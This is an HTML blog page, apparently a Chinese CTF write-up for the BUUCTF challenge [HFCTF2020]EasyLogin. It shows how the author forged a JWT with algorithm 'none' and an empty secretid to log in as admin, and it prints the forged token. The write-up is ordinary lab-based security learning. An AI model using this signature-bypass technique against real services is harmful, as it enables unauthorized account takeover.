@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="[HFCTF2020]EasyLogin">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buuctf-85-[HFCTF2020]EasyLogin">
+<meta property="og:url" content="http://example.com/post/a8c0011c.html">
+<meta property="og:site_name" content="Z1d10t&#39;s Blog">
+<meta property="og:description" content="[HFCTF2020]EasyLogin">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681961292803-2507d542-7b9c-4425-9228-4b0c8129a613.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681961802245-b79f5a21-698c-4857-8b2c-d169a365a871.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681961865878-e174b300-c12c-44a4-bd80-b9f0908ae748.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681962341963-9db7cc75-363b-4962-a3e9-305804f318ad.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681962377789-ed8fda04-f829-4128-b346-0eaa7fd13958.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681962413236-6f1c0fae-a99c-4e2c-bb3b-b1eddb193dfd.png">
+<meta property="article:published_time" content="2023-04-29T10:16:56.000Z">
+<meta property="article:modified_time" content="2023-04-29T10:17:58.361Z">
+<meta property="article:author" content="Z1d10t">
+<meta property="article:tag" content="jwt">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681961292803-2507d542-7b9c-4425-9228-4b0c8129a613.png">
+
+
+<link rel="canonical" href="http://example.com/post/a8c0011c.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/post/a8c0011c.html","path":"post/a8c0011c.html","title":"buuctf-85-[HFCTF2020]EasyLogin"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>buuctf-85-[HFCTF2020]EasyLogin | Z1d10t's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Z1d10t's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"> </p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-house fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tag fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-rectangle-list fa-fw"></i>分类</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于博主</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z1d10t"
+      src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar.png">
+  <p class="site-author-name" itemprop="name">Z1d10t</p>
+  <div class="site-description" itemprop="description">welcome to my blog (*^_^*)</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">38</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">73</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/post/a8c0011c.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar.png">
+      <meta itemprop="name" content="Z1d10t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z1d10t's Blog">
+      <meta itemprop="description" content="welcome to my blog (*^_^*)">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="buuctf-85-[HFCTF2020]EasyLogin | Z1d10t's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          buuctf-85-[HFCTF2020]EasyLogin
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-04-29 18:16:56 / 修改时间：18:17:58" itemprop="dateCreated datePublished" datetime="2023-04-29T18:16:56+08:00">2023-04-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/buuctf/" itemprop="url" rel="index"><span itemprop="name">buuctf</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>[HFCTF2020]EasyLogin</p>
+<span id="more"></span>
+
+<p>一道关于jwt认证的题目 之前有做过相同的题目</p>
+<p>申请一个账号登录  然后就是一个获取flag的输入框 但是我们普通身份肯定是获取不到的</p>
+<p>这里我试了试申请admin账号发现不行 做到这里估计是后面大概率是要伪造身份为admin然后getflag</p>
+<p>查看源码发现是用koa框架</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681961292803-2507d542-7b9c-4425-9228-4b0c8129a613.png" alt="img"></p>
+<p>然后看了一下别人的wp这个框架是用jwt鉴权的</p>
+<p>关于鉴权可以看这篇文章<a target="_blank" rel="noopener" href="https://juejin.cn/post/7003147063542153224">https://juejin.cn/post/7003147063542153224</a></p>
+<p>登录抓包</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681961802245-b79f5a21-698c-4857-8b2c-d169a365a871.png" alt="img"></p>
+<p>将其放入<a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a> 自动帮我们生成相关信息</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681961865878-e174b300-c12c-44a4-bd80-b9f0908ae748.png" alt="img"></p>
+<p>JWT(json web token)的三个部分依次如下：（参考：<a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html%EF%BC%89">http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html）</a></p>
+<ul>
+<li>Header（头部）</li>
+<li>Payload（负载）</li>
+<li>Signature（签名）</li>
+</ul>
+<p>比如：<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiIxMjMiLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTY4MTk1OTg3N30.jJv8tD-ULxBStlglQIsVQgnR-nC7hbxsPJqOQiF_qJg</code></p>
+<p>三部分之间用<code>.</code>间隔</p>
+<p>这里这里绕过需要将alg（算法）改为none 将secretid改为[]</p>
+<p>因为这个网站无法成none后的jwt编码 所以只能手动生成 也就是每部分base64编码 然后再用<code>.</code>连接</p>
+<p>因为算法已经是none了所以不需要第三段签名了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;alg&quot;: &quot;none&quot;,&quot;typ&quot;: &quot;JWT&quot;&#125;</span><br><span class="line">eyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ==</span><br><span class="line">&#123;&quot;secretid&quot;: [],&quot;username&quot;: &quot;admin&quot;,&quot;password&quot;: &quot;123&quot;,&quot;iat&quot;: 1681959877&#125;</span><br><span class="line">eyJzZWNyZXRpZCI6IFtdLCJ1c2VybmFtZSI6ICJhZG1pbiIsInBhc3N3b3JkIjogIjEyMyIsImlhdCI6IDE2ODE5NTk4Nzd9</span><br></pre></td></tr></table></figure>
+
+<p><code>eyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ.eyJzZWNyZXRpZCI6IFtdLCJ1c2VybmFtZSI6ICJhZG1pbiIsInBhc3N3b3JkIjogIjEyMyIsImlhdCI6IDE2ODE5NTk4Nzd9.</code>注意这里虽然签名部分被省略了 但是最后一个<code>.</code>要加上 并且签名中base64编码中用来补位<code>==</code>要删除</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681962341963-9db7cc75-363b-4962-a3e9-305804f318ad.png" alt="img"></p>
+<p>成功以admin身份登入</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681962377789-ed8fda04-f829-4128-b346-0eaa7fd13958.png" alt="img"></p>
+<p>获取flag即可</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681962413236-6f1c0fae-a99c-4e2c-bb3b-b1eddb193dfd.png" alt="img"></p>
+<p>其实这道题还是前期信息检索去明白他框架是jwt鉴权</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Z1d10t
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://example.com/post/a8c0011c.html" title="buuctf-85-[HFCTF2020]EasyLogin">http://example.com/post/a8c0011c.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/jwt/" rel="tag"># jwt</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/post/51b0b22f.html" rel="prev" title="buuctf-79-[红明谷CTF 2021]write_shell">
+                  <i class="fa fa-chevron-left"></i> buuctf-79-[红明谷CTF 2021]write_shell
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/post/d359692.html" rel="next" title="buuctf-86-[GYCTF2020]Ezsqli">
+                  buuctf-86-[GYCTF2020]Ezsqli <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2023.2 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z1d10t</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+    </div>
+  </footer>
+
+  
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
